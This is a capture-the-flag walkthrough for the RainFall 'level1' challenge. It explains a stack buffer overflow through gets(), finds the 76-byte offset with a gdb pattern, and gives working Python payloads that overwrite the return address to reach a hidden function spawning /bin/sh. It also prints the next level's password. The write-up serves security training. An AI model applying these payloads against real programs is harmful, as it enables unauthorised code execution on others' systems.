📘 Buffer Overflow Exploit: 
This is a classic stack-based buffer overflow example that demonstrates how you can redirect program execution to custom code by overflowing a buffer.

💡 How the stack layout works in a function call
When a function is called (like main()), the stack grows downward and sets up a frame like this:

| higher memory addresses |
+------------------------+
| function arguments     |
+------------------------+
| return address         | <-- Overwriting this = code execution
+------------------------+
| saved EBP (base ptr)   |
+------------------------+
| local variables        | <-- buffer[] lives here
+------------------------+
| lower memory addresses |

⚠️ Vulnerability Summary
The binary uses the unsafe gets() function.
gets() does not check how much input is provided.
So if you input more than the buffer can hold, it will start overwriting adjacent memory — including the saved return address on the stack.

This allows us to control the program's flow after the current function returns.

Example with buffer
Say we have this code:

void vulnerable() {
    char buffer[80];
    gets(buffer);
}

When vulnerable() is called, the stack looks like:
[buffer]          <-- 80 bytes
[saved EBP]       <-- previous base pointer (optional, depends on compiler)
[return address]  <-- where execution jumps after `vulnerable()` returns

So if you input more than 80 bytes, the next bytes overwrite the saved EBP (not dangerous yet), and then the return address.

🧠 Our Goal
There is a hidden function in the binary named run() located at: 0x08048444
This function calls: system("/bin/sh");
💡 If we overwrite the return address to jump to run(), we get a shell as the level1 user.

🔎 Finding the Offset
To exploit this, we first need to know how many bytes it takes to reach the saved return address on the stack.

Step 1: find offset with patterngenerator and check if EIP is overwritten
(gdb) run 
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

0x63413563 → as ASCII chars:
0x63 = 'c'
0x41 = 'A'
0x35 = '5'
0x63 = 'c'
So you get: 'cA5c' — but this is little-endian, so memory holds it as:
0x63 0x35 0x41 0x63 → "c5Ac"
'cA5c' -> "c5Ac" -> index 76

🛠 Crafting the Exploit
Here’s the working exploit:
(python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1

🔍 Explanation
python -c '...': We use Python to generate the exploit payload.
"A" * 76: Fills the buffer right up to the return address.
struct.pack("<I", 0x08048444): Packs the address of run() in little-endian format (\x44\x84\x04\x08).
< — little-endian (least significant byte is stored first)  // lscpu | grep "Byte Order"
I — unsigned 4-byte integer

cat: Keeps stdin open — sometimes required if the program reads input again.

| ./level1: Feeds the payload into the vulnerable binary.

✅ What Happens?
gets() reads our input (76 A's + address of run()).

When main() tries to return, it jumps to 0x08048444.

That’s the run() function → which runs system("/bin/sh").


level1@RainFall:~$ (python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1
or
python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level1

Good... Wait what?
./pass
/bin/sh: 1: ./pass: Permission denied
whoami
level2
cat /home/user/level2/.pass            
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


alternative:
level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/try

level1@RainFall:~$ cat /tmp/try - | ./level1 
Good... Wait what?


